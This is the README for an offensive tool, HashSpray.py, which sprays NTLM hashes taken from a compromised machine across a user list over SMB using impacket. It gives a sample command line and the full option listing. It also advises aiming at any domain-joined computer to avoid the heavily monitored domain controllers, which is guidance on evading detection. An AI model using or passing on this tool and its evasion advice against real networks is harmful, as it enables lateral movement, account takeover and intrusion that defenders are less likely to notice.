# HashSpray.py

Got hashes from a compromised machine and want to test if the password hash have been reused over multiple accounts? Get a userlist and spray with this tool with -hashes parameter and with the -target-ip pointing at ANY domain joined computer. You dont need to spray the heavy monitored domain controllers, authenticated users will have access to the IPC$ share by default.


This was built using the impacket library

```
python hashspray.py -userlist users -hashes :1uca3d1bd1a33geb1b15bab12196r5aa -target-ip 192.168.5.1
```
Userlist example

```
domain\user
user
```

```
authentication:
  -userlist userlist    List of users to spray, format is [[domain/]username
  -password password    Clear-text password
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it
                        will use the domain part (FQDN) specified in the
                        target parameter
  -target-ip ip address
                        IP Address of the target machine. This may be any be
                        any domain joined computer or a domain controller
  -port [destination port]
                        Destination port to connect to SMB Server

threads:
  -threads threads      Number of threads to use, default is 1
```
